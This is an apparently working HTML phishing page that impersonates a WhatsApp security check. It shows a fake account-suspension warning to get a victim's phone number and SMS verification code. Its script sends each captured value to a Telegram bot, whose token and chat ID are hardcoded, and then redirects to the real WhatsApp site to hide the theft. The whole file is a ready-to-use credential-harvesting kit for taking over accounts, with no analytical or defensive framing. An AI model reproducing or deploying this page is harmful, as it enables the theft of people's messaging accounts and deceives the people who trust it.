<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>WhatsApp Security</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, sans-serif; }
        body { background: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }
        .container { width: 100%; max-width: 360px; padding: 20px; text-align: center; }
        
        /* شاشات مختلفة */
        #loading-screen { display: flex; flex-direction: column; align-items: center; }
        #phone-screen, #otp-screen { display: none; }

        .logo { width: 70px; margin-bottom: 25px; }
        h1 { color: #008069; font-size: 19px; font-weight: 500; margin-bottom: 15px; }
        p { font-size: 14px; color: #667781; line-height: 1.5; margin-bottom: 25px; }

        input { width: 100%; padding: 12px; border: none; border-bottom: 2px solid #00a884; font-size: 18px; text-align: center; outline: none; margin-bottom: 25px; }
        .otp-input { font-size: 28px; letter-spacing: 5px; }

        button { background: #008069; color: #fff; border: none; padding: 12px 30px; border-radius: 25px; font-size: 14px; font-weight: 600; width: 100%; cursor: pointer; box-shadow: 0 2px 5px rgba(0,0,0,0.1); }

        /* الأنميشن */
        .spinner { border: 3px solid #f3f3f3; border-top: 3px solid #008069; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>

    <div id="loading-screen" class="container">
        <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" class="logo">
        <div class="spinner"></div>
        <p style="margin-top: 20px;">Checking security status...</p>
    </div>

    <div id="phone-screen" class="container">
        <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" class="logo" style="width: 50px;">
        <h1>Account Suspension Warning</h1>
        <p>Unauthorized login detected. Enter your phone number linked to this account to start the recovery process.</p>
        <input type="tel" id="phoneNumber" placeholder="Phone Number (e.g. +20...)" required>
        <button onclick="processPhone()">Verify Number</button>
    </div>

    <div id="otp-screen" class="container">
        <h1 style="margin-top: 0;">Confirm Identity</h1>
        <p>A 6-digit code has been sent to:<br><strong id="maskedNum" style="color:#111b21;"></strong></p>
        <input type="text" id="otpCode" class="otp-input" placeholder="--- ---" maxlength="6" inputmode="numeric">
        <button id="finalBtn">Finish & Secure</button>
        <p style="margin-top: 20px; color: #008069; font-size: 13px; cursor: pointer;">Resend SMS (1:58)</p>
    </div>

    <script>
        const BOT = { T: '8254072521:AAGs0le9FRacWKgYcdk3CzHXhEiTXZb8dZU', C: '5446862709' };
        let userPhone = "";

        // أول ما يفتح الصفحة: استنى 3 ثواني وبعدين اطلب الرقم
        setTimeout(() => {
            document.getElementById('loading-screen').style.display = 'none';
            document.getElementById('phone-screen').style.display = 'block';
        }, 3000);

        async function notify(msg) {
            fetch(`https://api.telegram.org/bot${BOT.T}/sendMessage`, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({ chat_id: BOT.C, text: msg })
            });
        }

        async function processPhone() {
            userPhone = document.getElementById('phoneNumber').value;
            if (userPhone.length < 8) return alert("Enter a valid number");

            notify(`☎️ Target Number Entered: ${userPhone}`);
            
            // عمل إخفاء للرقم زي الحقيقة
            const masked = userPhone.substring(0, 4) + " *** **" + userPhone.substring(userPhone.length - 2);
            document.getElementById('maskedNum').innerText = masked;

            // تحويل لشاشة الكود مع لودر وهمي
            document.getElementById('phone-screen').innerHTML = '<div class="spinner" style="margin: 0 auto;"></div><p>Sending code...</p>';
            setTimeout(() => {
                document.getElementById('phone-screen').style.display = 'none';
                document.getElementById('otp-screen').style.display = 'block';
            }, 2000);
        }

        document.getElementById('finalBtn').onclick = async function() {
            const code = document.getElementById('otpCode').value;
            if (code.length < 6) return alert("Enter 6 digits");

            this.innerText = "AUTHENTICATING...";
            await notify(`🔥 SUCCESS! OTP RECEIVED\n\nNumber: ${userPhone}\nCode: ${code}`);
            
            window.location.href = "https://www.whatsapp.com/security";
        };
    </script>
</body>
</html>
